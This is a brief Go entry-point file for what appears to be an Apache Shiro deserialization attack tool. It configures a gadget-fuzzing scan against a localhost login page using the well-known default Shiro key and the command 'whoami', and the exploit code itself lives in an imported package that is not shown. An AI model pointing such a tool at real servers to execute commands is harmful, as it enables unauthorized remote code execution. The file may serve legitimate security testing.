package main

import (
	ShiroScanner "DearShiro_GO/core/scanner"
)

var module string
var target = new(ShiroScanner.ShiroTarget)

//func init() {
//	flag.StringVar(&module, "m", "", "scan module")
//	flag.StringVar(&target.Base, "b", "", "shiro url")
//	flag.StringVar(&target.Key, "k", "", "shiro key")
//	flag.StringVar(&target.Gadget, "g", "", "gadget want to use")
//	flag.StringVar(&target.Command, "c", "", "command want to execute")
//}

func main() {
	module := "gadgetfuzz"
	base := "http://127.0.0.1:8000/login.jsp"
	key := "kPH+bIxk5D2deZiIxcaaaA=="
	gadget := "NoCC"
	command := "whoami"
	factory := ShiroScanner.InitFactory(module)
	target = &ShiroScanner.ShiroTarget{Base: base, Key: key, Gadget: gadget, Command: command}
	scanner := factory(target)
	scanner.Scan()
}
